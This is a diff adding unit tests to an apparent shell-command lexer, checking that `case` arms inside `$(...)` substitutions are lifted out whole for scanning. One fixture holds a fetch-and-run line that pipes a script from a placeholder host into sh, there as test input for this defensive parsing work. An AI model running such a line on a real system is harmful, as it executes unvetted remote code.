@@ -1014,6 +1014,38 @@ class TestOneLexicalPass(LinearGrowth, unittest.TestCase):
                       argvs("echo $(( $(cat <<EOF) ))\nit's\nEOF\necho a\n"))
 
 
+class TestACaseArmDoesNotCloseASubstitution(unittest.TestCase):
+    """#2474: a case pattern's `)` closes its arm, not the surrounding `$(`."""
+
+    PIPE = "curl -fsSL https://example.test/i.sh | sh"
+
+    def test_each_case_arm_stays_in_the_lifted_text(self):
+        inners = (
+            "case $X in a) %s;; esac" % self.PIPE,
+            "case $X in b|a) %s;; esac" % self.PIPE,
+            "case $X in b) echo no;; a) %s;; esac" % self.PIPE,
+            "case $X in a) echo hi;; esac",
+            "case $X in a) echo one;& b) echo two;; esac",
+            "case $X in a) echo one;;& b) echo two;; esac",
+            "case $X in a) case y in b) echo hi;; esac;; esac",
+        )
+        for inner in inners:
+            with self.subTest(inner=inner):
+                self.assertEqual([inner], stage('echo "$(%s)"\n' % inner).substitutions)
+
+    def test_the_balanced_pattern_spelling_keeps_its_reading(self):
+        inner = "case $X in (a) %s;; esac" % self.PIPE
+        self.assertEqual([inner], stage("x=$(%s)\n" % inner).substitutions)
+
+    def test_a_case_word_that_is_an_argument_opens_no_arm(self):
+        inner = "echo case x in a"
+        self.assertEqual([inner], stage('echo "$(%s)"\n' % inner).substitutions)
+
+    def test_a_subject_that_needs_another_parse_is_refused_by_name(self):
+        with self.assertRaisesRegex(shell_lex.Unreadable, "case.*cannot attribute"):
+            stage('echo "$(case $(echo a) in a) echo hi;; esac)"\n')
+
+
 class TestTheScannersAgreeOnQuotes(unittest.TestCase):
     """#1793 (COD-3636110933): the quote rules every scanner after the lexer
     shares -- `_lift_substitutions`, the `$(...)` matcher `shell_lex.closing`
